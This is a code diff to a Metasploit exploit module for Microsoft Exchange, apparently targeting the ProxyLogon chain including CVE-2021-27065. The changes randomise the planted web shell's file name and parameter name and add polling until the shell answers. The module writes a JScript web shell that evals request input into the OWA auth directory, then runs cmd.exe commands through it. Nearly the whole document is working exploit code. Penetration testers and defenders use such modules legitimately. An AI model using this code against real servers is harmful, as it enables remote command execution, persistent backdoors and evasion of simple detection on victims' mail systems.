@@ -90,6 +90,7 @@ class MetasploitModule < Msf::Exploit::Remote
     register_advanced_options([
       OptBool.new('ForceExploit', [false, 'Override check result', false]),
       OptString.new('MapiClientApp', [true, 'This is MAPI client version sent in the request', 'Outlook/15.0.4815.1002']),
+      OptInt.new('MaxWaitLoop', [true, 'Max counter loop to wait for OAB Virtual Dir reset', 30]),
       OptString.new('UserAgent', [true, 'The HTTP User-Agent sent in the request', 'Mozilla/5.0'])
     ])
   end
@@ -102,16 +103,16 @@ class MetasploitModule < Msf::Exploit::Remote
     cmd = "Response.Write(new ActiveXObject(\"WScript.Shell\").Exec(\"cmd /c #{cmd}\").StdOut.ReadAll());"
     received = send_request_raw(
       'method' => 'POST',
-      'uri' => normalize_uri('/owa/auth/todo.aspx'),
+      'uri' => normalize_uri("/owa/auth/#{@random_filename}"),
       'ctype' => 'application/x-www-form-urlencoded',
-      'data' => "cmd=#{cmd}"
+      'data' => "#{@random_inputname}=#{cmd}"
     )
 
     received
   end
 
   def install_payload(server_name, canary, oab_id)
-    input_name = 'cmd'
+    input_name = "#{rand_text_alpha(4..8)}"
     shell = "http://o/#<script language=\"JScript\" runat=\"server\">function Page_Load(){eval(Request[\"#{input_name}\"],\"unsafe\");}</script>"
     data = {
       'identity': {
@@ -312,6 +313,22 @@ class MetasploitModule < Msf::Exploit::Remote
 
     fail_with(Failure::Unknown, 'Could\'t write the payload on the remote target') if remote_file.empty?
 
+    # wait a lot.
+    i = 0
+    while i < datastore['MaxWaitLoop']  do
+      received = send_request_cgi({
+        'method' => 'GET',
+        'uri' => normalize_uri("/owa/auth/#{remote_file}")
+      }, 2.5)
+      if received
+        break if received.code == 200
+      end
+
+      print_warning(" * wail a lot (#{i})")
+      sleep 5
+      i += 1
+    end
+
     [input_name, remote_file]
   end
 
@@ -353,7 +370,7 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def write_payload(server_name, canary, oab_id)
-    remote_file = "todo.aspx"
+    remote_file = "#{rand_text_alpha(4..8)}.aspx"
     remote_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth"
     remote_path = "\\\\127.0.0.1\\c$\\#{remote_path}\\#{remote_file}"
 
@@ -403,6 +420,9 @@ class MetasploitModule < Msf::Exploit::Remote
 
     print_status(message('Attempt to exploit for CVE-2021-27065'))
     shell_info = run_cve_2021_27065(exploit_info[0], exploit_info[1], exploit_info[2])
+
+    @random_inputname = shell_info[0]
+    @random_filename = shell_info[1]
 
     print_good(" * yeeting #{datastore['PAYLOAD']} payload at #{peer}")
 
